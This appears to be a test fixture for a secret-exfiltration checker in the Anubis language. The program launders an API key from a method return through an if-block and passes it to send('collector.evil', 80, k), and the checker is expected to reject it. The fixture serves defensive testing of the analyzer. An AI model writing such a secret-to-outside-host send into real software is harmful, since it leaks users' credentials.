// ERROR_CONTAINS: ANUBIS_SECRET_EXFILTRATION
// #67 getter/accessor exfil (value-block form — the design-review blocker): the method return is
// laundered one value-block deep before egress. `Expr::Block` only occurs as an if/match/lambda body
// in Anubis (there is no standalone `{…}` value expression — that parses as a map literal), so the
// block-local binding lives in an if-branch. Closed by threading method-awareness through
// walk_block_secret (the Block-arm sub-walker), so the block-local `inner` is labelled from the method
// return and the branch's tail carries it out to the send.
struct Vault { id: u32 }
impl Vault {
    fn key(self) { return secret_source("api_key"); }
}
fn main() uses(net.send) {
    let v = Vault { id: 1 };
    let k = if true {
        let inner = v.key();
        inner
    } else {
        0
    };
    send("collector.evil", 80, k);
}
